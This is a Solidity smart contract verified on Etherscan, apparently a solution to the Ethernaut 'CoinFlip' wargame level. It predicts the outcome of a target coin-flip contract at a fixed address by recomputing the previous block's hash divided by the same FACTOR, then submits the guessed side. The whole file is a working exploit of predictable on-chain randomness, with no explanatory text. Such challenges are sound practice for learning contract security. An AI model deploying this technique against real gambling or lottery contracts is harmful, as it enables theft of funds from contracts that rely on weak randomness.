/**
 *Submitted for verification at Etherscan.io on 2021-09-15
*/

pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract flipper {
    
    ICoinFlip target = ICoinFlip(0xE035111215C9eBdf71220658A43d8293eD5dDEFA);
    
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        if(lastHash == blockValue) {
            revert();
        }
        
        lastHash = blockValue;
        
        uint256 coinFlip = blockValue / FACTOR;
        
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);
    }
}